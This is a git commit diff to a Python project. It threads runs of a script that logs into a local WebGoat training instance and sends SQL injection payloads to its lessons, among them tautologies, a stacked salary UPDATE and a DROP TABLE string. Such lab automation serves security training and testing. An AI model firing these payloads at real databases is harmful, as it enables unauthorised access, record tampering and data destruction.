1511a88b70cfe47f704df93e976f91fc1bbbe7e7
Yohan Kim <yohan.kim.1@etsmtl.net>
2023-03-28 02:18:07 -0400

    incomplete threading

--- main.py
+++ main.py
@@ -1,9 +1,42 @@
 from threading import Thread
 import scenarios.webgoat_sample as wg
+import scenarios.scenario_sample as ss
 
 if __name__ == '__main__':
-    t1 = Thread(target=wg.run, args=["t1",])
-    t2 = Thread(target=wg.run, args=["t2",])
 
-    t1.start()
-    t2.start()
+    #webgoat_sample
+    #t1 = Thread(target=wg.run, args=["t1",])
+    #t2 = Thread(target=wg.run, args=["t2",])
+    #t1.daemon = True
+    #t2.daemon = True
+
+    #scenario_sample
+    s1 = ss.Scenario("s1")
+    s2 = ss.Scenario("s2")
+
+    t1 = Thread(target=s1.run)
+    t2 = Thread(target=s2.run)
+
+    try:        
+        t1.start()
+        t2.start()
+    except(KeyboardInterrupt, SystemExit):
+        #s1.stop()
+        #s2.stop()
+        pass
+
+    print("press ctrl+c to stop")
+    input("")
+
+    #thread subclass
+    #s1 = ss.Scenario("s1")
+    #s2 = ss.Scenario("s2")
+    #try:
+    #    s1.start()
+    #    s2.start()
+    #    #s1.join()
+    #    #s2.join()
+    #except(KeyboardInterrupt, SystemExit):
+    #    print("stopping")
+    #    s1.stop()
+    #    s2.stop()
--- scenarios/webgoat_sample.py
+++ scenarios/webgoat_sample.py
@@ -1,6 +1,9 @@
 import requests
 import time
 
+def log(text):
+    print(text)
+
 def run(thread_name):
     host="http://127.0.0.1:8080/WebGoat"
 
@@ -12,56 +15,48 @@ def run(thread_name):
 
     params = { 'username':'admin1', 'password':'admin1' }
     r = s.post(host + "/login", params=params)
-    print(thread_name)
-    print(r)
+    log(thread_name + ' ' + str(r.status_code))
 
     time.sleep(1)
 
     r = s.get(host + "/SqlInjection.lesson.lesson")
-    print(thread_name)
-    print(r)
+    log(thread_name + ' ' + str(r.status_code))
 
     time.sleep(1)
 
     params = { 'query':"select department from Employees where first_name='Bob'" }
     r = s.post(host + "/SqlInjection/attack2", params=params)
-    print(thread_name)
-    print(r)
+    log(thread_name + ' ' + str(r.status_code))
 
     time.sleep(1)
 
     params = { 'account':"=Smith'", 'operator':"or", 'injection':"'1'='1" }
     r = s.post(host + "/SqlInjection/assignment5a", params=params)
-    print(thread_name)
-    print(r)
+    log(thread_name + ' ' + str(r.status_code))
 
     time.sleep(1)
 
     params = { 'login_count':'1', 'userid':"0 or 1=1" }
     r = s.post(host + "/SqlInjection/assignment5b", params=params)
-    print(thread_name)
-    print(r)
+    log(thread_name + ' ' + str(r.status_code))
 
     time.sleep(1)
 
     params = { 'name':"Smith' or 1=1;--", 'auth_tan':'3SL99A' }
     r = s.post(host + "/SqlInjection/attack8", params=params)
-    print(thread_name)
-    print(r)
+    log(thread_name + ' ' + str(r.status_code))
 
     time.sleep(1)
 
     params = { 'name':"Smith'; update employees set salary=999999 where last_name='Smith';--", 'auth_tan':'3SL99A' }
     r = s.post(host + "/SqlInjection/attack9", params=params)
-    print(thread_name)
-    print(r)
+    log(thread_name + ' ' + str(r.status_code))
 
     time.sleep(1)
 
     params = { 'action_string':"';drop table access_log;--" }
     r = s.post(host + "/SqlInjection/attack10", params=params)
-    print(thread_name)
-    print(r)
+    log(thread_name + ' ' + str(r.status_code))
 
     time.sleep(1)
 
